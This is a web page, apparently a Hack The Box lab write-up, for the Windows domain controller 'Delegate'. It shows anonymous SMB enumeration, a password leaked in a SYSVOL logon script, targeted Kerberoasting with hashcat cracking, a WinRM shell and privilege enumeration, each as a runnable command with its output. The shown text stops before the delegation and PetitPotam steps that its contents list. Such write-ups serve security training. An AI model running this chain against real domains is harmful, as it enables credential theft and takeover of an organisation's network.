@@ -1,0 +1,1039 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Delegate - b0nyo</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="red">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#delegate-writeup" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../.." title="b0nyo" class="md-header__button md-logo" aria-label="b0nyo" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            b0nyo
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Delegate
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="red"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../.." title="b0nyo" class="md-nav__button md-logo" aria-label="b0nyo" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    b0nyo
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Machines
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Machines
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hack The Box
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../research/research/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Research
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#port-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Port Scanning
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Port Scanning">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#service-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Service Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#smb-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SMB Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SMB Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sysvol-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SYSVOL Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#targeted-kerberoasting-nthompson" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Targeted Kerberoasting — N.Thompson
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-nthompson-and-user-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Shell as N.Thompson and User Flag
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Shell as N.Thompson and User Flag">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#privilege-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation-unconstrained-delegation-petitpotam" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation — Unconstrained Delegation + PetitPotam
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation — Unconstrained Delegation + PetitPotam">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-create-a-machine-account-and-enable-unconstrained-delegation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1 — Create a machine account and enable Unconstrained Delegation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-add-spns-and-a-dns-record-for-evilpc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2 — Add SPNs and a DNS record for EVILPC
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-capture-the-tgt-with-krbrelayx-petitpotam" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3 — Capture the TGT with krbrelayx + PetitPotam
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-dcsync-with-dc1s-tgt" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 4 — DCSync with DC1$'s TGT
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-as-administrator-root-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Shell as Administrator — Root Flag
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<p><img alt="Delegate" src="../img/Delegate_BANNER.png" /></p>
+<h1 id="delegate-writeup">Delegate-WriteUp</h1>
+<p>In this Windows Active Directory machine rated <strong>Medium</strong>, we'll compromise a Domain Controller by chaining several misconfigurations starting from unauthenticated SMB access. The key insight is that a logon script stored in SYSVOL leaks credentials in plaintext, and the compromised user has <code>SeEnableDelegationPrivilege</code>, which allows us to configure Unconstrained Delegation on a machine account we create. Ultimately capturing a TGT from the DC itself. You will learn how to:</p>
+<ul>
+<li>Enumerate SMB shares anonymously and read SYSVOL logon scripts</li>
+<li>Extract plaintext credentials from <code>.bat</code> files in Group Policy scripts</li>
+<li>Perform Targeted Kerberoasting when you have <code>GenericWrite</code> over a user</li>
+<li>Crack TGS hashes offline with <code>hashcat</code> and <code>rockyou.txt</code></li>
+<li>Abuse <code>SeEnableDelegationPrivilege</code> + <code>SeMachineAccountPrivilege</code> to create a machine account with Unconstrained Delegation</li>
+<li>Add DNS records and SPNs to AD via LDAP</li>
+<li>Capture a Domain Controller TGT using <code>krbrelayx</code> + <code>PetitPotam</code></li>
+<li>Perform DCSync with the captured TGT to dump all domain hashes</li>
+</ul>
+<p>🧰 Tools used: <code>nmap</code>, <code>nxc</code>, <code>smbclient</code>, <code>targetedKerberoast.py</code>, <code>hashcat</code>, <code>evil-winrm</code>, <code>addcomputer.py</code>, <code>bloodyAD</code>, <code>addspn.py</code>, <code>dnstool.py</code>, <code>krbrelayx.py</code>, <code>PetitPotam.py</code>, <code>secretsdump.py</code>.</p>
+<p>Let's get started.</p>
+<hr />
+<h2 id="port-scanning">Port Scanning</h2>
+<p>We started with a full TCP SYN scan across all ports on the target.</p>
+<pre><code class="language-bash">sudo nmap --open -Pn -p- -sS -n -vvv 10.129.234.69
+
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+3389/tcp  open  ms-wbt-server    syn-ack ttl 127
+5985/tcp  open  wsman            syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+47001/tcp open  winrm            syn-ack ttl 127
+49664/tcp open  unknown          syn-ack ttl 127
+49665/tcp open  unknown          syn-ack ttl 127
+49666/tcp open  unknown          syn-ack ttl 127
+49668/tcp open  unknown          syn-ack ttl 127
+49669/tcp open  unknown          syn-ack ttl 127
+49670/tcp open  unknown          syn-ack ttl 127
+49671/tcp open  unknown          syn-ack ttl 127
+49673/tcp open  unknown          syn-ack ttl 127
+50078/tcp open  unknown          syn-ack ttl 127
+51525/tcp open  unknown          syn-ack ttl 127
+60893/tcp open  unknown          syn-ack ttl 127
+60899/tcp open  unknown          syn-ack ttl 127
+</code></pre>
+<p>Classic Domain Controller port profile. All expected AD services are present, plus WinRM on 5985 which will be useful later.</p>
+<h3 id="service-enumeration">Service Enumeration</h3>
+<pre><code class="language-bash">nmap -sVC -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49668,49669,49670,49671,49673,50078,51525,60893,60899 10.129.234.69 -Pn
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-15 19:59:22Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=DC1.delegate.vl
+| Not valid before: 2026-04-14T19:49:17
+|_Not valid after:  2026-10-14T19:49:17
+| rdp-ntlm-info:
+|   Target_Name: DELEGATE
+|   NetBIOS_Domain_Name: DELEGATE
+|   NetBIOS_Computer_Name: DC1
+|   DNS_Domain_Name: delegate.vl
+|   DNS_Computer_Name: DC1.delegate.vl
+|   DNS_Tree_Name: delegate.vl
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-04-15T20:00:21+00:00
+|_ssl-date: 2026-04-15T20:01:00+00:00; -20s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49670/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  msrpc         Microsoft Windows RPC
+50078/tcp open  msrpc         Microsoft Windows RPC
+51525/tcp open  msrpc         Microsoft Windows RPC
+60893/tcp open  msrpc         Microsoft Windows RPC
+60899/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled and required
+|_clock-skew: mean: -20s, deviation: 0s, median: -20s
+| smb2-time:
+|   date: 2026-04-15T20:00:22
+|_  start_date: N/A
+</code></pre>
+<p>Domain is <code>delegate.vl</code>, DC hostname is <code>DC1</code>. Windows Server 2022 (build 20348). SMB signing is required, which rules out NTLM relay attacks over SMB.
+I add <code>delegate.vl</code> and <code>DC1.delegate.vl</code> to <code>/etc/hosts</code></p>
+<hr />
+<h2 id="smb-enumeration">SMB Enumeration</h2>
+<p>We check whether null/guest authentication is allowed on SMB shares.</p>
+<pre><code class="language-bash">nxc smb 10.129.234.69 -u 'Guest' -p '' --shares
+
+SMB  10.129.234.69  445  DC1  [+] delegate.vl\Guest:
+SMB  10.129.234.69  445  DC1  Share       Permissions
+SMB  10.129.234.69  445  DC1  IPC$        READ
+SMB  10.129.234.69  445  DC1  NETLOGON    READ
+SMB  10.129.234.69  445  DC1  SYSVOL      READ
+</code></pre>
+<p>Guest authentication works and we have read access to <code>SYSVOL</code> and <code>NETLOGON</code>. These are default shares on every DC, but they can contain Group Policy files and logon scripts — a common source of sensitive information.</p>
+<h3 id="sysvol-enumeration">SYSVOL Enumeration</h3>
+<pre><code class="language-bash">smbclient -N //10.129.234.69/SYSVOL -c 'recurse; ls'
+
+&lt;SNIP&gt;
+
+\delegate.vl\scripts
+  users.bat    A    159    Sat Aug 26 09:54:29 2023
+
+&lt;SNIP&gt;
+</code></pre>
+<p>There's a <code>users.bat</code> script in the <code>scripts</code> directory. We download the entire SYSVOL tree and inspect it.</p>
+<pre><code class="language-bash">smbclient -N //10.129.234.69/SYSVOL -c 'prompt OFF; recurse ON; mget *'
+
+❯ tree
+.
+├── DfsrPrivate
+├── Policies
+│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
+│   │   ├── GPT.INI
+│   │   ├── MACHINE
+│   │   │   ├── Microsoft
+│   │   │   │   └── Windows NT
+│   │   │   │       └── SecEdit
+│   │   │   │           └── GptTmpl.inf
+│   │   │   ├── Registry.pol
+│   │   │   └── Scripts
+│   │   │       ├── Shutdown
+│   │   │       └── Startup
+│   │   └── USER
+│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
+│       ├── GPT.INI
+│       ├── MACHINE
+│       │   └── Microsoft
+│       │       └── Windows NT
+│       │           └── SecEdit
+│       │               └── GptTmpl.inf
+│       └── USER
+└── scripts
+    └── users.bat
+
+19 directories, 6 files
+</code></pre>
+<pre><code class="language-bash">cat scripts/users.bat -p
+rem @echo off
+net use * /delete /y
+net use v: \\dc1\development
+
+if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator &lt;REDACTED&gt;
+</code></pre>
+<p>A plaintext password is hardcoded in the logon script. The script maps a network drive for user <code>A.Briggs</code> using <code>Administrator</code> as the username with password <code>&lt;REDACTED&gt;</code>. We try it directly against <code>A.Briggs</code>:</p>
+<pre><code class="language-bash">nxc smb 10.129.234.69 -u 'A.Briggs' -p '&lt;REDACTED&gt;'
+SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.69   445    DC1              [+] delegate.vl\A.Briggs:&lt;REDACTED&gt;
+</code></pre>
+<p>Valid credentials for <code>A.Briggs</code>.</p>
+<hr />
+<h2 id="targeted-kerberoasting-nthompson">Targeted Kerberoasting — N.Thompson</h2>
+<p>With BloodHound we confirm that <code>A.Briggs</code> has <strong>GenericWrite</strong> over <code>N.Thompson</code>. This allows us to set an SPN on <code>N.Thompson</code> and request a TGS ticket for it — a technique known as Targeted Kerberoasting.</p>
+<p><img alt="BloodHound showing A.Briggs has GenericWrite over N.Thompson" src="../img/Delegate_0001.png" /></p>
+<pre><code class="language-bash">python3 targetedKerberoast.py -d delegate.vl -u 'A.Briggs' -p '&lt;REDACTED&gt;'
+
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[+] Printing hash for (N.Thompson)
+$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$26f9d0fd35f2e256&lt;REDACTED_HASH&gt;
+</code></pre>
+<p>We crack it offline with <code>hashcat</code>:</p>
+<pre><code class="language-bash">hashcat -m 13100 n.thompson_hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+
+$krb5tgs$23$*N.Thompson$&lt;REDACTED_HASH&gt;:&lt;REDACTED&gt;
+</code></pre>
+<hr />
+<h2 id="shell-as-nthompson-and-user-flag">Shell as N.Thompson and User Flag</h2>
+<pre><code class="language-bash">nxc winrm 10.129.234.69 -u 'N.Thompson' -p '&lt;REDACTED&gt;'
+WINRM       10.129.234.69   5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)
+WINRM       10.129.234.69   5985   DC1              [+] delegate.vl\N.Thompson:&lt;REDACTED&gt; (Pwn3d!)
+</code></pre>
+<pre><code class="language-powershell">evil-winrm -i 10.129.234.69 -u 'N.Thompson' -p '&lt;REDACTED&gt;'
+
+Evil-WinRM shell v3.9
+
+&lt;SNIP&gt;
+
+*Evil-WinRM* PS C:\Users\N.Thompson\Documents&gt;
+</code></pre>
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\N.Thompson\Documents&gt; type ..\Desktop\user.txt
+&lt;USER_FLAG&gt;
+</code></pre>
+<h3 id="privilege-enumeration">Privilege Enumeration</h3>
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\N.Thompson\Documents&gt; whoami /all
+
+USER INFORMATION
+----------------
+
+User Name           SID
+=================== ==============================================
+delegate\n.thompson S-1-5-21-1484473093-3449528695-2030935120-1108
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                            Attributes
+=========================================== ================ ============================================== ==================================================
+Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+DELEGATE\delegation admins                  Group            S-1-5-21-1484473093-3449528695-2030935120-1121 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                                                    State
+============================= ============================================================== =======
+SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
+SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+</code></pre>
+<p>Two critical privileges stand out:</p>
+<ul>
+<li><strong><code>SeMachineAccountPrivilege</code></strong> — lets us add a new machine account to the domain.</li>
+<li><strong><code>SeEnableDelegationPrivilege</code></strong> — lets us configure Unconstrained Delegation on any account we control.</li>
+</ul>
+<p>With these two together the attack path is clear: create a machine account, enable Unconstrained Delegation on it, force the DC to authenticate to it, and capture its TGT.</p>
+<hr />
